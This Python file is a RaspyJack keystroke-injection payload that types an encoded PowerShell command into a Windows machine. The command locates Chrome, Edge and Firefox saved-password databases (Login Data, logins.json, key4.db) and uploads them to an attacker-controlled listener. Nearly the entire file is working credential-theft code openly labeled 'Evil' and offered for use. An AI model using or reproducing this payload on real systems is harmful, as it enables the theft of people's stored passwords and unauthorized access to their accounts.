#!/usr/bin/env python3
"""
RaspyJack *payload* – **Evil: Browser Password DB Stealer (Windows)**
======================================================================
A HID attack that locates the password database files for common
Chromium-based browsers (Chrome, Edge) and Firefox on Windows, and
exfiltrates them to an attacker-controlled server.

The actual decryption of these files must be done offline on the
attacker's machine.

**NOTE:** This requires a listener to be running to receive the data.
"""

import os, sys, subprocess, time
sys.path.append(os.path.abspath(os.path.join(__file__, '..', '..')))
import RPi.GPIO as GPIO
import LCD_1in44, LCD_Config
from PIL import Image, ImageDraw, ImageFont

# --- CONFIGURATION ---
LISTENER_IP = "192.168.1.100"
LISTENER_PORT = "8000"

# --- Display Functions ---
def show_message(lines, color="lime"):
    LCD = LCD_1in44.LCD()
    LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    image = Image.new("RGB", (128, 128), "BLACK")
    draw = ImageDraw.Draw(image)
    font = ImageFont.truetype("/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", 12)
    y = 40
    for line in lines:
        draw.text((10, y), line, font=font, fill=color)
        y += 15
    LCD.LCD_ShowImage(image, 0, 0)

# --- Main Attack Logic ---
def run_attack():
    show_message(["HID Attack:", "Password Stealer"])
    
    if subprocess.run("which P4wnP1_cli", shell=True, capture_output=True).returncode != 0:
        show_message(["ERROR:", "P4wnP1_cli", "not found!"])
        return

    # PowerShell script to find and upload browser DBs
    ps_script = f"""
$paths = @(
    "$env:LOCALAPPDATA\\Google\\Chrome\\User Data\\Default\\Login Data",
    "$env:LOCALAPPDATA\\Microsoft\\Edge\\User Data\\Default\\Login Data",
    "$env:APPDATA\\Mozilla\\Firefox\\Profiles\\*.default-release\\logins.json",
    "$env:APPDATA\\Mozilla\\Firefox\\Profiles\\*.default-release\\key4.db"
)
foreach ($path in $paths) {{
    $resolved = Resolve-Path $path -ErrorAction SilentlyContinue
    if ($resolved) {{
        $file = $resolved.Path
        $filename = Split-Path $file -Leaf
        $uri = "http://{LISTENER_IP}:{LISTENER_PORT}/$filename"
        try {{
            Invoke-RestMethod -Uri $uri -Method Post -InFile $file
        }} catch {{}}
    }}
}}
"""
    # The script is complex, so we'll download and execute it
    ps_command_b64 = "powershell -e " + subprocess.check_output(f"echo '{ps_script}' | iconv -t UTF-16LE | base64 -w 0", shell=True).decode().strip()

    script = f"""
GUI r
delay(500)
type("powershell")
delay(200)
press("ENTER")
delay(750)
type("{ps_command_b64}")
delay(200)
press("ENTER")
delay(3000)
type("exit")
press("ENTER")
"""
    
    cli_command = f"P4wnP1_cli hid job -c '{script}'"
    
    try:
        subprocess.run(cli_command, shell=True, check=True, timeout=45)
        show_message(["Attack Sent!", "Check listener", "for DB files."])
    except Exception as e:
        show_message(["Attack FAILED!"])
        print(f"Error running HID attack: {e}", file=sys.stderr)

# --- Execution ---
if __name__ == '__main__':
    try:
        run_attack()
        time.sleep(4)
    finally:
        LCD = LCD_1in44.LCD()
        LCD.LCD_Clear()
        GPIO.cleanup()
        print("Browser Password Stealer payload finished.")
